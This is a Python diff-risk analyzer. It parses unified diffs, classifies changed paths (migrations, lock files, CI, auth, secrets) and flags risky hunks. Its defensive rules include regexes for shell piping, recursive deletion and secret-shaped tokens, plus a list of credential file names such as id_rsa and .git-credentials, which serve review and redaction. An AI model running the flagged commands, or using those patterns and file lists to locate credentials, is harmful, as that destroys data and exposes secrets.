#!/usr/bin/env python3
"""Objective stats and risk signals for a unified diff (ai-diff-review-protocol).

Reads a unified diff from a file or from stdin: `git diff`, `git show -p`,
`git format-patch`, `diff -u` / `diff -ruN`, or a diff pasted into a chat
(surrounding prose, markdown fences, CRLF line endings and blank context
lines whose leading space was trimmed are tolerated). Git is not needed.
Standard library only.

It reports files changed, additions and deletions, added / deleted / renamed
files, mode changes and binary files; classifies every path by review
boundary (migration, lockfile, deps, ci, config, auth, secrets, test, docs);
flags hunk-level danger signals; counts packages added to lock files; prints
the thresholds it applied and whether a manual hunk-by-hunk pass is required.

Usage:
    python3 diff_risk.py change.diff
    git diff main... | python3 diff_risk.py
    python3 diff_risk.py --json change.diff
    python3 diff_risk.py --selftest

Exit codes: 0 = parsed, no manual pass required; 1 = parsed, a manual
hunk-by-hunk pass is required; 2 = input error (unreadable file, no unified
diff found, bad arguments).
"""

from __future__ import annotations

import argparse
import contextlib
import io
import json
import os
import re
import subprocess
import sys
import tempfile
from dataclasses import dataclass, field
from pathlib import Path

# ----------------------------------------------------------------- thresholds
# SKILL.md ("Diff stats and thresholds") prints the same numbers. Change both together.
FILES_SCOPE_CHECK = 4    # 4-8 files: check for scope creep (note only)
FILES_MANUAL = 9         # 9+ files: manual hunk-by-hunk pass
LINES_MANUAL = 200       # 200+ changed lines (additions + deletions, lock files excluded)
TESTS_PROD_MIN = 100     # production code lines changed ...
TESTS_RATIO = 0.10       # ... with test lines changed below 10 % of that: ask why (note only)
MANUAL_BOUNDARIES = ("migration", "auth", "secrets", "ci", "config", "deps")

CATEGORY_LABELS = {
    "migration": "database migration or schema",
    "lockfile": "dependency lock file",
    "deps": "dependency manifest",
    "ci": "CI/CD, build or deploy",
    "config": "runtime or tool config",
    "auth": "authentication / authorization / crypto",
    "secrets": "secrets or credential file",
    "test": "tests",
    "docs": "documentation",
    "data": "data file (JSON, YAML, CSV, XML) outside the boundaries above",
    "code": "other code",
}
CATEGORY_ORDER = list(CATEGORY_LABELS)


class InputError(Exception):
    """Unreadable input or no unified diff in it (exit code 2)."""


# ----------------------------------------------------------------- data model

@dataclass
class Line:
    kind: str                 # ' ' context, '+' added, '-' removed
    text: str
    old_no: int | None
    new_no: int | None


@dataclass
class Hunk:
    header: str
    old_start: int | None
    old_count: int | None
    new_start: int | None
    new_count: int | None
    section: str
    lines: list[Line] = field(default_factory=list)
    complete: bool = True
    missing: tuple[int, int] = (0, 0)


@dataclass
class FileDiff:
    raw_old: str | None = None     # path as written, before prefix stripping
    raw_new: str | None = None
    old_path: str | None = None
    new_path: str | None = None
    old_is_null: bool = False      # '--- /dev/null'
    new_is_null: bool = False      # '+++ /dev/null'
    git: bool = False
    has_minus_plus: bool = False
    rename_from: str | None = None
    rename_to: str | None = None
    copy_from: str | None = None
    copy_to: str | None = None
    similarity: int | None = None
    old_mode: str | None = None
    new_mode: str | None = None
    new_file_mode: str | None = None
    deleted_file_mode: str | None = None
    binary: bool = False
    combined: bool = False
    hunks: list[Hunk] = field(default_factory=list)
    status: str = "modified"
    categories: list[str] = field(default_factory=list)

    @property
    def path(self) -> str:
        return self.new_path or self.old_path or "(unknown file)"

    @property
    def additions(self) -> int:
        return sum(1 for h in self.hunks for ln in h.lines if ln.kind == "+")

    @property
    def deletions(self) -> int:
        return sum(1 for h in self.hunks for ln in h.lines if ln.kind == "-")

    def open_for_headers(self) -> bool:
        return not self.hunks and not self.has_minus_plus and not self.binary


# ----------------------------------------------------------------- parsing

HUNK_RE = re.compile(r"^@@ -(\d+)(?:,(\d+))? \+(\d+)(?:,(\d+))? @@(.*)$")
LOOSE_HUNK_RE = re.compile(r"^@@(?!@)(.*)$")
COMBINED_HUNK_RE = re.compile(r"^@@@+ ")
COMMIT_RE = re.compile(r"^(commit [0-9a-f]{7,64}\b|From [0-9a-f]{40} )")
STAT_LINE_RE = re.compile(r"^\s*\S.*\|\s+(\d+ [+-]*|Bin\b.*)$")
NUMSTAT_LINE_RE = re.compile(r"^(\d+|-)\t(\d+|-)\t\S")
C_ESCAPES = {"n": 10, "t": 9, '"': 34, "\\": 92, "a": 7, "b": 8, "f": 12, "r": 13, "v": 11}


def unquote_c(text: str) -> str:
    """Undo git's C-style quoting: "a/sp ace/\\303\\251.py" -> a/sp ace/é.py."""
    if not (len(text) >= 2 and text[0] == '"' and text[-1] == '"'):
        return text
    body = text[1:-1]
    out = bytearray()
    j = 0
    while j < len(body):
        ch = body[j]
        if ch == "\\" and j + 1 < len(body):
            octal = body[j + 1:j + 4]
            if len(octal) == 3 and all(c in "01234567" for c in octal):
                out.append(int(octal, 8))
                j += 4
                continue
            if body[j + 1] in C_ESCAPES:
                out.append(C_ESCAPES[body[j + 1]])
                j += 2
                continue
        out.extend(ch.encode("utf-8"))
        j += 1
    return out.decode("utf-8", errors="replace")


def read_quoted(text: str) -> tuple[str, str]:
    """Split '"quoted path" rest' into (unquoted path, rest)."""
    j = 1
    while j < len(text):
        if text[j] == "\\":
            j += 2
            continue
        if text[j] == '"':
            return unquote_c(text[:j + 1]), text[j + 1:]
        j += 1
    return text, ""


def header_path(rest: str) -> str | None:
    """Path from a '--- ' / '+++ ' line; None for /dev/null. Drops diff -u timestamps."""
    rest = rest.strip("\r")
    if rest.startswith('"'):
        path, _ = read_quoted(rest)
    else:
        path = rest.split("\t", 1)[0].rstrip()
    if path in ("/dev/null", "dev/null", "nul", "NUL"):
        return None
    return path


def strip_component(path: str) -> str:
    parts = path.split("/", 1)
    return parts[1] if len(parts) == 2 else path


def split_git_paths(rest: str) -> tuple[str, str]:
    """Paths from 'diff --git A B' (A and B may contain spaces or be quoted)."""
    rest = rest.strip()
    if rest.startswith('"'):
        old, remainder = read_quoted(rest)
        remainder = remainder.strip()
        return old, unquote_c(remainder) if remainder.startswith('"') else remainder
    positions = [m.start() for m in re.finditer(" ", rest)]
    for pos in positions:
        a, b = rest[:pos], rest[pos + 1:]
        if b.startswith('"'):
            return a, unquote_c(b)
        if strip_component(a) == strip_component(b):
            return a, b
    if positions:
        middle = positions[len(positions) // 2]
        return rest[:middle], rest[middle + 1:]
    return rest, rest


class Parser:
    def __init__(self, text: str):
        text = text.lstrip("\ufeff")
        text = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", text)      # git diff --color=always
        text = text.replace("\r\n", "\n").replace("\r", "\n")
        self.lines = text.split("\n")
        if self.lines and self.lines[-1] == "":
            self.lines.pop()
        self.files: list[FileDiff] = []
        self.commits = 0
        self.warnings: list[str] = []
        self.trimmed_blank = 0
        self.stat_lines = 0
        self.context_diff = False

    def new_file(self, git: bool = False) -> FileDiff:
        f = FileDiff(git=git)
        self.files.append(f)
        return f

    def run(self) -> None:
        lines, n = self.lines, len(self.lines)
        cur: FileDiff | None = None
        i = 0
        while i < n:
            line = lines[i]
            if COMMIT_RE.match(line):
                self.commits += 1
                i += 1
                continue
            if line.startswith("diff --git "):
                cur = self.new_file(git=True)
                cur.raw_old, cur.raw_new = split_git_paths(line[len("diff --git "):])
                i += 1
                continue
            if line.startswith(("diff --cc ", "diff --combined ")):
                cur = self.new_file(git=True)
                cur.combined = True
                cur.raw_old = cur.raw_new = line.split(" ", 2)[2].strip()
                i += 1
                continue
            if line.startswith("diff ") or line.startswith("Index: "):
                # 'diff -ruN a/x b/x' or svn 'Index: x': the ---/+++ lines that follow carry the paths
                cur = self.new_file(git=False)
                i += 1
                continue
            if cur is not None and cur.git and cur.open_for_headers() and self.git_extended(cur, line):
                i += 1
                continue
            if line.startswith("Binary files ") and line.endswith(" differ"):
                if cur is None or not cur.open_for_headers():
                    cur = self.new_file(git=False)
                cur.binary = True
                m = re.match(r"^Binary files (.+) and (.+) differ$", line)
                if m:
                    old, new = header_path(m.group(1)), header_path(m.group(2))
                    cur.raw_old = old if old is not None else cur.raw_old
                    cur.raw_new = new if new is not None else cur.raw_new
                    cur.old_is_null = cur.old_is_null or old is None
                    cur.new_is_null = cur.new_is_null or new is None
                i += 1
                continue
            if line == "GIT binary patch":
                if cur is None:
                    cur = self.new_file(git=True)
                cur.binary = True
                i += 1
                while i < n and lines[i].strip() != "":
                    i += 1
                continue
            if line.startswith("--- ") and i + 1 < n and lines[i + 1].startswith("+++ "):
                if cur is None or not cur.open_for_headers():
                    cur = self.new_file(git=False)
                old = header_path(line[4:])
                new = header_path(lines[i + 1][4:])
                cur.has_minus_plus = True
                cur.old_is_null, cur.new_is_null = old is None, new is None
                if old is not None:
                    cur.raw_old = old
                if new is not None:
                    cur.raw_new = new
                i += 2
                continue
            if line.startswith("***************"):
                self.context_diff = True
                i += 1
                continue
            m = HUNK_RE.match(line)
            if m:
                if cur is None:
                    cur = self.new_file(git=False)
                    self.warnings.append("hunk without a file header: path unknown, every rule applied")
                if cur.combined:
                    i = self.skip_combined(i + 1)
                    continue
                hunk = Hunk(
                    header=line.split(" @@", 1)[0] + " @@",
                    old_start=int(m.group(1)),
                    old_count=int(m.group(2)) if m.group(2) is not None else 1,
                    new_start=int(m.group(3)),
                    new_count=int(m.group(4)) if m.group(4) is not None else 1,
                    section=m.group(5).strip(),
                )
                cur.hunks.append(hunk)
                i = self.read_counted_hunk(i + 1, hunk)
                continue
            if COMBINED_HUNK_RE.match(line):
                if cur is not None:
                    cur.combined = True
                i = self.skip_combined(i + 1)
                continue
            m = LOOSE_HUNK_RE.match(line)
            if m:
                if cur is None:
                    cur = self.new_file(git=False)
                    self.warnings.append("hunk without a file header: path unknown, every rule applied")
                hunk = Hunk(header="@@ (no line numbers) @@", old_start=None, old_count=None,
                            new_start=None, new_count=None, section=m.group(1).strip("@ ").strip())
                cur.hunks.append(hunk)
                i = self.read_loose_hunk(i + 1, hunk)
                continue
            if STAT_LINE_RE.match(line) or NUMSTAT_LINE_RE.match(line):
                self.stat_lines += 1
            i += 1

    def git_extended(self, cur: FileDiff, line: str) -> bool:
        m = re.match(r"^(old mode|new mode|deleted file mode|new file mode) (\d+)$", line)
        if m:
            key, mode = m.group(1), m.group(2)
            if key == "old mode":
                cur.old_mode = mode
            elif key == "new mode":
                cur.new_mode = mode
            elif key == "deleted file mode":
                cur.deleted_file_mode = mode
            else:
                cur.new_file_mode = mode
            return True
        m = re.match(r"^(rename from|rename to|rename old|rename new|copy from|copy to) (.+)$", line)
        if m:
            key, path = m.group(1), unquote_c(m.group(2))
            if key in ("rename from", "rename old"):
                cur.rename_from = path
            elif key in ("rename to", "rename new"):
                cur.rename_to = path
            elif key == "copy from":
                cur.copy_from = path
            else:
                cur.copy_to = path
            return True
        m = re.match(r"^(similarity|dissimilarity) index (\d+)%$", line)
        if m:
            cur.similarity = int(m.group(2)) if m.group(1) == "similarity" else 100 - int(m.group(2))
            return True
        if re.match(r"^index [0-9a-fA-F]+(,[0-9a-fA-F]+)*\.\.[0-9a-fA-F]+( \d+)?$", line):
            return True
        return False

    def read_counted_hunk(self, i: int, hunk: Hunk) -> int:
        lines, n = self.lines, len(self.lines)
        old_left, new_left = hunk.old_count or 0, hunk.new_count or 0
        old_no, new_no = hunk.old_start or 0, hunk.new_start or 0
        while i < n and (old_left > 0 or new_left > 0):
            line = lines[i]
            if line.startswith("\\"):
                i += 1
                continue
            tag = line[:1]
            if tag == " " or line == "":
                if old_left <= 0 or new_left <= 0:
                    break
                if line == "":
                    self.trimmed_blank += 1
                hunk.lines.append(Line(" ", line[1:], old_no, new_no))
                old_no, new_no = old_no + 1, new_no + 1
                old_left, new_left = old_left - 1, new_left - 1
            elif tag == "-":
                if old_left <= 0:
                    break
                hunk.lines.append(Line("-", line[1:], old_no, None))
                old_no, old_left = old_no + 1, old_left - 1
            elif tag == "+":
                if new_left <= 0:
                    break
                hunk.lines.append(Line("+", line[1:], None, new_no))
                new_no, new_left = new_no + 1, new_left - 1
            else:
                break
            i += 1
        while i < n and lines[i].startswith("\\"):
            i += 1
        if old_left > 0 or new_left > 0:
            hunk.complete = False
            hunk.missing = (old_left, new_left)
        return i

    def read_loose_hunk(self, i: int, hunk: Hunk) -> int:
        lines, n = self.lines, len(self.lines)
        while i < n:
            line = lines[i]
            if line.startswith("\\"):
                i += 1
                continue
            if line.startswith("--- ") and i + 1 < n and lines[i + 1].startswith("+++ "):
                break
            if line.startswith("diff ") or HUNK_RE.match(line) or LOOSE_HUNK_RE.match(line):
                break
            if line == "":
                nxt = lines[i + 1] if i + 1 < n else ""
                if nxt[:1] in (" ", "+", "-") and not nxt.startswith(("--- ", "+++ ")):
                    hunk.lines.append(Line(" ", "", None, None))
                    self.trimmed_blank += 1
                    i += 1
                    continue
                break
            tag = line[:1]
            if tag not in (" ", "+", "-"):
                break
            hunk.lines.append(Line(tag, line[1:], None, None))
            i += 1
        return i

    def skip_combined(self, i: int) -> int:
        lines, n = self.lines, len(self.lines)
        while i < n and lines[i][:1] in (" ", "+", "-", "\\") and not lines[i].startswith(("--- ", "+++ ")):
            i += 1
        return i


def decide_strip(files: list[FileDiff]) -> int:
    """1 if paths carry a prefix component (a/ b/, or old-dir/ new-dir/), else 0."""
    strip = keep = 0
    for f in files:
        if f.rename_from or f.copy_from or not f.raw_old or not f.raw_new:
            continue
        old, new = f.raw_old.split("/"), f.raw_new.split("/")
        if len(old) >= 2 and len(new) >= 2 and old[1:] == new[1:] and old[0] != new[0]:
            strip += 1
        elif f.raw_old == f.raw_new:
            keep += 1
    if strip or keep:
        return 1 if strip >= keep else 0
    present = [p for f in files for p in (f.raw_old, f.raw_new) if p]
    if present and all(re.match(r"^[a-z]/", p) for p in present):
        return 1
    return 0


def finish_paths(files: list[FileDiff]) -> None:
    strip = decide_strip(files)
    for f in files:
        def fix(p: str | None) -> str | None:
            if p is None:
                return None
            return strip_component(p) if strip else p
        f.old_path = None if f.old_is_null else fix(f.raw_old)
        f.new_path = None if f.new_is_null else fix(f.raw_new)
        if f.rename_from or f.rename_to:
            f.old_path = f.rename_from or f.old_path
            f.new_path = f.rename_to or f.new_path
        if f.copy_from or f.copy_to:
            f.old_path = f.copy_from or f.old_path
            f.new_path = f.copy_to or f.new_path
        if f.new_file_mode or (f.old_is_null and not f.new_is_null):
            f.status, f.old_path = "added", None
        elif f.deleted_file_mode or (f.new_is_null and not f.old_is_null):
            f.status, f.new_path = "deleted", None
        elif f.rename_from or f.rename_to:
            f.status = "renamed"
        elif f.copy_from or f.copy_to:
            f.status = "copied"
        elif (len(f.hunks) == 1 and f.hunks[0].old_start == 0 and f.hunks[0].old_count == 0
              and not f.git):
            f.status, f.old_path = "added", None      # diff -N: new file shown against empty
        elif (len(f.hunks) == 1 and f.hunks[0].new_start == 0 and f.hunks[0].new_count == 0
              and not f.git):
            f.status, f.new_path = "deleted", None


# ----------------------------------------------------------------- classification

LOCKFILES = {
    "package-lock.json", "npm-shrinkwrap.json", "yarn.lock", "pnpm-lock.yaml", "bun.lockb", "bun.lock",
    "poetry.lock", "pipfile.lock", "uv.lock", "pdm.lock", "cargo.lock", "gemfile.lock", "composer.lock",
    "go.sum", "mix.lock", "packages.lock.json", "podfile.lock", "pubspec.lock", "flake.lock",
    "gradle.lockfile", "conan.lock", "deno.lock", "package.resolved", "cartfile.resolved",
    ".terraform.lock.hcl",
}
DEPS_NAMES = {
    "package.json", "pyproject.toml", "setup.py", "setup.cfg", "pipfile", "environment.yml",
    "environment.yaml", "cargo.toml", "go.mod", "gemfile", "composer.json", "pom.xml", "build.gradle",
    "build.gradle.kts", "settings.gradle", "settings.gradle.kts", "packages.config",
    "directory.packages.props", "podfile", "pubspec.yaml", "mix.exs", "deno.json", "vcpkg.json",
    "conanfile.txt", "conanfile.py", "constraints.txt",
}
MIGRATION_DIRS = {"migrations", "migration", "migrate", "alembic", "flyway", "liquibase",
                  "db_migrations", "schema_migrations"}
MIGRATION_NAMES = {"schema.sql", "structure.sql", "schema.rb", "schema.prisma"}
CI_DIRS = {".circleci", ".buildkite", ".woodpecker", "k8s", "kubernetes", "helm", "terraform", "ansible",
           "deploy", "deployment", "deployments", "infra", "infrastructure"}
CI_TOP_DIRS = {"charts"}   # only at the repository root: src/components/charts is UI code
CI_NAMES = {".gitlab-ci.yml", "jenkinsfile", "azure-pipelines.yml", ".travis.yml",
            "bitbucket-pipelines.yml", ".drone.yml", "appveyor.yml", "cloudbuild.yaml", "cloudbuild.yml",
            "buildspec.yml", "procfile", "fly.toml", "vercel.json", "netlify.toml", "app.yaml",
            "serverless.yml", "serverless.yaml", "compose.yaml", "compose.yml", "skaffold.yaml",
            "codemagic.yaml", ".woodpecker.yml"}
SECRET_NAMES = {".env", ".npmrc", ".pypirc", ".netrc", ".htpasswd", ".git-credentials", "id_rsa",
                "id_dsa", "id_ecdsa", "id_ed25519", "credentials", "service-account.json"}
SECRET_EXTS = {"pem", "key", "p12", "pfx", "jks", "keystore", "kdbx", "ovpn", "gpg"}
ENV_TEMPLATES = {".env.example", ".env.sample", ".env.template", ".env.dist", ".env.defaults"}
CONFIG_DIRS = {"config", "configs", "conf", "settings", ".config", "etc"}
CONFIG_EXTS = {"ini", "cfg", "conf", "properties", "env", "toml"}
AUTH_TOKENS = {
    "auth", "authn", "authz", "authentication", "authenticate", "authenticator", "authorization",
    "authorize", "authorizer", "login", "logout", "signin", "signup", "session", "sessions", "oauth",
    "oauth2", "oidc", "openid", "saml", "sso", "jwt", "jwks", "token", "permission",
    "permissions", "perms", "rbac", "acl", "acls", "password", "passwords", "passwd", "credential",
    "credentials", "security", "csrf", "crypto", "cryptography", "mfa", "otp", "totp", "keychain",
}  # "tokens" is left out on purpose: design-token files (tokens.json) are not auth code
NON_CODE_EXTS = {"md", "markdown", "rst", "adoc", "txt", "css", "scss", "sass", "less", "styl", "svg",
                 "png", "jpg", "jpeg", "gif", "webp", "ico", "pdf", "snap"}
TEST_DIRS = {"test", "tests", "__tests__", "spec", "specs", "testing", "e2e", "cypress", "playwright",
             "__snapshots__", "__mocks__", "testdata", "test_data", "fixtures", "integration_tests",
             "unit_tests", "androidtest"}
TEST_NAME_RE = re.compile(
    r"(^test_.*\.py$|^tests?\.py$|^conftest\.py$|_test\.(py|go|rb|exs?|dart|c|cc|cpp)$"
    r"|\.(test|spec)\.[A-Za-z0-9]+$|_spec\.rb$|(Test|Tests|IT)\.(java|kt|scala|cs|php|swift)$|\.snap$)"
)
DOC_EXTS = {"md", "markdown", "rst", "adoc", "rtf"}
DATA_EXTS = {"json", "jsonl", "ndjson", "yaml", "yml", "xml", "csv", "tsv", "toml"}
DOC_STEMS = {"readme", "changelog", "license", "licence", "notice", "authors", "contributors", "copying"}
CODE_EXTS = {
    "py", "pyi", "js", "jsx", "mjs", "cjs", "ts", "tsx", "go", "rs", "java", "kt", "kts", "scala", "rb",
    "php", "cs", "fs", "c", "h", "cc", "cpp", "cxx", "hpp", "hh", "m", "mm", "swift", "dart", "ex", "exs",
    "erl", "clj", "cljs", "hs", "ml", "lua", "r", "jl", "pl", "pm", "sh", "bash", "zsh", "ps1", "sql",
    "vue", "svelte", "groovy", "elm", "nim", "zig", "sol",
}


def path_tokens(path: str) -> set[str]:
    tokens: set[str] = set()
    for seg in re.split(r"[/._\-\s]+", path):
        for tok in re.findall(r"[A-Z]?[a-z]+|[A-Z]+(?![a-z])|\d+[a-z]*", seg):
            tokens.add(tok.lower())
        tokens.add(seg.lower())
    return tokens


def classify(path: str) -> list[str]:
    if path == "(unknown file)":
        return []
    low = path.lower()
    parts = low.split("/")
    name, dirs = parts[-1], set(parts[:-1])
    ext = name.rsplit(".", 1)[-1] if "." in name.lstrip(".") else ""
    stem = name.split(".", 1)[0] if not name.startswith(".") else name
    orig_name = path.split("/")[-1]
    cats: list[str] = []

    if name in LOCKFILES or (name.endswith(".lock") and name not in DEPS_NAMES):
        cats.append("lockfile")
    if name in DEPS_NAMES or re.match(r"^requirements[\w.-]*\.(txt|in)$", name) or name.endswith(
            (".gemspec", ".csproj", ".fsproj", ".vbproj")) or "requirements" in dirs and ext in ("txt", "in"):
        cats.append("deps")
    if dirs & MIGRATION_DIRS or name in MIGRATION_NAMES or re.match(r"^v\d+(\.\d+|_\d+)*__.+\.sql$", name) \
            or (ext == "sql" and ("schema" in name or "migrat" in name)):
        cats.append("migration")
    if (low.startswith((".github/workflows/", ".github/actions/", ".gitlab/ci/")) or dirs & CI_DIRS
            or (len(parts) > 1 and parts[0] in CI_TOP_DIRS)
            or name in CI_NAMES or name == "dockerfile" or name.startswith("dockerfile.")
            or name.endswith(".dockerfile") or re.match(r"^docker-compose[\w.-]*\.ya?ml$", name)
            or ext in ("tf", "tfvars") or name.endswith(".tf.json")):
        cats.append("ci")
    if name not in ENV_TEMPLATES and (
            name in SECRET_NAMES or name.startswith(".env.") or ext in SECRET_EXTS or ext == "env"
            or re.search(r"(^|[._-])(secrets?|credentials?)([._-]|$)", name)
            or re.match(r"^service[-_]account.*\.json$", name)):
        cats.append("secrets")
    if (name in ENV_TEMPLATES or dirs & CONFIG_DIRS or "config" in name or "settings" in name
            or (len(parts) > 1 and parts[0].startswith(".") and parts[0] != ".github")
            or (ext in CONFIG_EXTS and "deps" not in cats and "ci" not in cats and "lockfile" not in cats)
            or re.match(r"^\.(eslint|prettier|babel|stylelint|swc|mocha|nyc)rc", name)
            or re.match(r"^(appsettings|application)[\w.-]*\.(json|ya?ml|properties)$", name)
            or re.search(r"feature[-_]?flags?|^flags\.(json|ya?ml|toml)$", name)):
        if "secrets" not in cats and "lockfile" not in cats:
            cats.append("config")
    if ext not in NON_CODE_EXTS and ext not in DOC_EXTS and path_tokens(path) & AUTH_TOKENS:
        cats.append("auth")
    if dirs & TEST_DIRS or TEST_NAME_RE.search(orig_name):
        # a test that exercises auth or config is still a test; only a real secret or lock file inside
        # a test directory keeps its boundary
        cats = [c for c in cats if c in ("secrets", "lockfile")] + ["test"]
    if not cats and (ext in DOC_EXTS or ext == "txt" or dirs & {"docs", "doc"}
                     or (stem in DOC_STEMS and ext in DOC_EXTS | {"", "txt"})):
        cats.append("docs")
    if not cats and name.startswith("."):
        cats.append("config")     # .gitignore, .dockerignore, .gitattributes and similar dotfiles
    if not cats and ext in DATA_EXTS:
        cats.append("data")
    if not cats:
        cats.append("code")
    return cats


def is_code_file(f: FileDiff) -> bool:
    name = f.path.lower().split("/")[-1]
    ext = name.rsplit(".", 1)[-1] if "." in name else ""
    return ext in CODE_EXTS


# ----------------------------------------------------------------- hunk signals

SECRET_VALUE_RES = [
    re.compile(r"-----BEGIN (?:[A-Z]+ )*PRIVATE KEY-----"),
    re.compile(r"\bAKIA[0-9A-Z]{16}\b"),
    re.compile(r"\bgh[pousr]_[A-Za-z0-9]{30,}\b"),
    re.compile(r"\bxox[abprs]-[A-Za-z0-9-]{10,}"),
    re.compile(r"\bsk-(?:proj-|live_|test_|ant-)?[A-Za-z0-9_-]{16,}"),
    re.compile(r"\bAIza[0-9A-Za-z_-]{30,}"),
]
SECRET_ASSIGN_RE = re.compile(
    r"(?i)\b(api[_-]?key|secret(?:[_-]?key)?|access[_-]?key|auth[_-]?token|token|passw(?:or)?d|pwd)\b"
    r"[\"']?\s*[:=]\s*[\"']([^\"'\s]{8,})[\"']"
)
NOT_NULL_RE = re.compile(r"(?i)\bNOT\s+NULL\b")
IS_NOT_NULL_RE = re.compile(r"(?i)\bIS\s+NOT\s+NULL\b")
AUTO_VALUE_RE = re.compile(r"(?i)\b(DEFAULT|GENERATED|IDENTITY|SERIAL|BIGSERIAL|SMALLSERIAL|AUTO_INCREMENT|AUTOINCREMENT)\b")
CREATE_TABLE_RE = re.compile(r"(?i)\bCREATE\s+(?:\w+\s+)*TABLE\b")
ALTER_RE = re.compile(r"(?i)\b(ALTER\s+TABLE|ADD\s+COLUMN|ALTER\s+COLUMN)\b")
TABLE_END_RE = re.compile(r"^\s*\)[^;]*;?\s*$")

RULES: list[tuple[str, str, re.Pattern[str], str]] = [
    # (kind, side, regex, scope)  scope: any | test | code
    ("destructive-schema", "+", re.compile(
        r"(?i)\bDROP\s+(TABLE|COLUMN|DATABASE|SCHEMA|INDEX|CONSTRAINT|VIEW|TYPE|TRIGGER|FUNCTION)\b"
        r"|\bTRUNCATE\s+(TABLE\s+)?[\w\"`]|\bALTER\s+TABLE\b.*\bDROP\b|\bDELETE\s+FROM\s+[\w.\"`]+\s*;"), "any"),
    ("destructive-schema", "+", re.compile(
        r"\bop\.drop_(table|column|index|constraint)\s*\(|\b(drop_table|remove_column|drop_column)\b"
        r"|migrations\.(RemoveField|DeleteModel)\b|\.(dropTable|dropColumn|dropColumns)\s*\("), "any"),
    ("shell-exec", "+", re.compile(
        r"shell\s*=\s*True|shell:\s*true|\bos\.(system|popen)\s*\(|\bchild_process\b|\bexecSync\s*\("
        r"|Runtime\.getRuntime\(\)\.exec|\|\s*(sudo\s+)?(ba|z)?sh\b"), "any"),
    ("dynamic-eval", "+", re.compile(r"(?<![\w.$])(eval|exec)\s*\(|\bnew\s+Function\s*\("), "any"),
    ("recursive-delete", "+", re.compile(
        r"\brm\s+(-[a-zA-Z]*\s+)*-[a-zA-Z]*[rR]|\b(shutil\.)?rmtree\s*\(|\brimraf\b"
        r"|\bfs(\.promises)?\.(rm|rmdir)(Sync)?\s*\(|\bfind\b.*\s-delete\b|FileUtils\.(rm_rf|rm_r|remove_dir)"
        r"|\bos\.RemoveAll\s*\(|Remove-Item\b.*-Recurse|\brmdir\s+/s\b"), "any"),
    ("unsafe-deserialization", "+", re.compile(
        r"\b(c?pickle|dill|marshal|joblib|jsonpickle)\.loads?\s*\(|\bshelve\.open\s*\("
        r"|\byaml\.(unsafe_)?load(_all)?\s*\(|\btorch\.load\s*\(|allow_pickle\s*=\s*True"
        r"|\bObjectInputStream\b|(?<![\w>])unserialize\s*\(|\bMarshal\.load\b"), "any"),
    ("privilege", "+", re.compile(
        r"\bsudo\b|\bset(e|re|res)?[ug]id\s*\(|\bchmod\s+(-R\s+)?0?777\b|\bchmod\s+[ugoa]*\+[rwx]*s"
        r"|\b0o?777\b|--privileged\b|\bprivileged:\s*true"), "any"),
    ("test-disabled", "+", re.compile(
        r"@pytest\.mark\.(skip|skipif|xfail)\b|\bpytest\.skip\s*\(|@unittest\.(skip|skipIf|skipUnless|expectedFailure)\b"
        r"|\b(it|test|describe|context)\.(skip|only)\s*\(|\bx(it|test|describe|context)\s*\("
        r"|@(Disabled|Ignore)\b|\bt\.Skip(Now|f)?\s*\(|#\[ignore\]"), "test"),
]
ASSERT_RE = re.compile(
    r"^\s*assert\b|\bassert\w*\s*[(!]|\bAssert\.\w+\s*\(|\bexpect\s*[({]|\.should\b"
    r"|\bt\.(Error|Errorf|Fatal|Fatalf|Fail|FailNow)\s*\(|\b(require|assert)\.\w+\s*\(|XCTAssert\w*\s*\("
    r"|\bpytest\.raises\s*\(|\.to(\.not)?\.(be|equal|eql|have|throw|include|match|deep)\b"
    r"|\bto\s+(eq|be|eql|equal|raise_error|include|match)\b"
)
SIGNAL_TEXT = {
    "not-null-without-default": "NOT NULL without DEFAULT outside CREATE TABLE: fails on a table that "
                                "already has rows unless it is backfilled first",
    "destructive-schema": "drops or empties schema objects or data",
    "deleted-assertion": "assertion removed and not re-added elsewhere in the diff",
    "test-disabled": "test skipped, marked xfail, or focused with .only",
    "shell-exec": "runs a shell command",
    "dynamic-eval": "evaluates a string as code",
    "recursive-delete": "deletes recursively",
    "unsafe-deserialization": "deserializes data that may not be trusted",
    "privilege": "raises or widens privileges",
    "secret-literal": "looks like a credential written into the code (value redacted)",
}


def mask(value: str) -> str:
    return f"{value[:4]}...({len(value)} chars)"


def redact(text: str) -> str:
    for rx in SECRET_VALUE_RES:
        text = rx.sub(lambda m: mask(m.group(0)), text)
    return SECRET_ASSIGN_RE.sub(lambda m: m.group(0).replace(m.group(2), mask(m.group(2))), text)


def strip_sql_comment(text: str) -> str:
    """Drop SQL / Python comments so that 'NOT NULL' inside a comment does not count."""
    if text.lstrip().startswith(("--", "#")):
        return ""
    return re.split(r"\s--\s", text, maxsplit=1)[0]


def not_null_hits(f: FileDiff) -> list[tuple[Hunk, Line]]:
    """Added NOT NULL columns without a default, outside CREATE TABLE statements."""
    hits: list[tuple[Hunk, Line]] = []
    sqlish = "migration" in f.categories or f.path.lower().endswith(".sql") or not f.categories
    for hunk in f.hunks:
        new_side = [ln for ln in hunk.lines if ln.kind in (" ", "+")]
        for idx, ln in enumerate(new_side):
            if ln.kind != "+":
                continue
            code = strip_sql_comment(ln.text)
            orm = False
            if re.search(r"\badd_column\s*\(.*\bnullable\s*=\s*False\b", code) and "server_default" not in code:
                orm = True
            elif re.search(r"\balter_column\s*\(.*\bnullable\s*=\s*False\b", code):
                orm = True
            elif re.search(r"\badd_column\b.*\bnull:\s*false\b", code) and "default:" not in code:
                orm = True
            elif re.search(r"\bchange_column_null\b.*,\s*false\b", code):
                orm = True
            if orm:
                hits.append((hunk, ln))
                continue
            if not (sqlish or ALTER_RE.search(code)):
                continue
            bare = IS_NOT_NULL_RE.sub("", code)
            if not NOT_NULL_RE.search(bare) or AUTO_VALUE_RE.search(bare):
                continue
            if ALTER_RE.search(code):
                hits.append((hunk, ln))
                continue
            inside: bool | None = None
            for prev in reversed(new_side[:idx]):
                if CREATE_TABLE_RE.search(prev.text):
                    inside = True
                    break
                if ALTER_RE.search(prev.text) or ";" in strip_sql_comment(prev.text):
                    inside = False
                    break
            if inside is None and CREATE_TABLE_RE.search(hunk.section) and ";" not in hunk.section:
                inside = True
            if inside is None:
                for nxt in new_side[idx + 1:]:
                    text = strip_sql_comment(nxt.text)
                    if TABLE_END_RE.match(text):
                        inside = True
                        break
                    if ";" in text or ALTER_RE.search(text):
                        inside = False
                        break
            if not inside:
                hits.append((hunk, ln))
    return hits


@dataclass
class Signal:
    kind: str
    path: str
    side: str
    line_no: int | None
    text: str
    hunk: str


